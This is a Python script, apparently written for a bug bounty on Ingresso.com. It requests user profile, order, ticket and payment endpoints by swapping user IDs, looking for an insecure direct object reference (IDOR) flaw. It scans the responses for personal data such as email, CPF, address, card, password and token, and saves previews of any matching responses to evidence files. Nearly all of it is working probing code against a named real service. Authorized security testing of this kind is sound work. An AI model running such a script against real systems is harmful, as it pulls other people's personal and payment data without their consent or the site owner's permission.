#!/usr/bin/env python3
"""
Manual IDOR Validation Script - Ingresso.com Bug Bounty
Validates IDOR vulnerabilities and captures evidence
"""

import requests
import json
import time
from datetime import datetime

def validate_idor_endpoints():
    """Validate IDOR vulnerabilities manually with evidence capture"""
    
    # IDOR endpoints discovered
    idor_endpoints = [
        "https://api.ingresso.com/v1/user/12345/profile",
        "https://api.ingresso.com/v1/user/67890/orders", 
        "https://api.ingresso.com/v1/user/11111/tickets",
        "https://api.ingresso.com/v1/user/22222/payments"
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8'
    }
    
    results = []
    
    print("[*] Iniciando validacao manual do IDOR...")
    print("[*] Testando endpoints descobertos...")
    
    for endpoint in idor_endpoints:
        print(f"\n[>] Testando: {endpoint}")
        
        try:
            response = requests.get(endpoint, headers=headers, timeout=10)
            
            result = {
                'endpoint': endpoint,
                'status_code': response.status_code,
                'response_size': len(response.content),
                'timestamp': datetime.now().isoformat(),
                'vulnerable': False,
                'evidence': None
            }
            
            # Check for IDOR vulnerability indicators
            if response.status_code == 200:
                content = response.text.lower()
                
                # Look for sensitive data patterns
                sensitive_patterns = [
                    'email', 'cpf', 'telefone', 'endereco', 
                    'cartao', 'pagamento', 'senha', 'token'
                ]
                
                found_patterns = [p for p in sensitive_patterns if p in content]
                
                if found_patterns:
                    result['vulnerable'] = True
                    result['evidence'] = {
                        'sensitive_data_found': found_patterns,
                        'response_preview': response.text[:500] + "..." if len(response.text) > 500 else response.text
                    }
                    
                    print(f"[!] VULNERAVEL! Dados sensiveis expostos: {found_patterns}")
                    
                    # Save evidence
                    evidence_file = f"evidencias/idor_evidence_{endpoint.split('/')[-2]}_{endpoint.split('/')[-1]}.json"
                    with open(evidence_file, 'w', encoding='utf-8') as f:
                        json.dump(result, f, indent=2, ensure_ascii=False)
                    
                    print(f"[+] Evidencia salva: {evidence_file}")
                else:
                    print("[+] Sem dados sensiveis expostos")
            else:
                print(f"[i] Status: {response.status_code}")
            
            results.append(result)
            time.sleep(2)  # Respectful delay
            
        except Exception as e:
            print(f"[-] Erro: {str(e)}")
            results.append({
                'endpoint': endpoint,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            })
    
    # Save complete results
    with open('relatorios/idor_validation_results.json', 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    print(f"\n[*] Validacao concluida! Resultados salvos em: relatorios/idor_validation_results.json")
    
    # Summary
    vulnerable_count = sum(1 for r in results if r.get('vulnerable', False))
    print(f"[*] Resumo: {vulnerable_count}/{len(results)} endpoints vulneraveis")
    
    return results

if __name__ == "__main__":
    validate_idor_endpoints()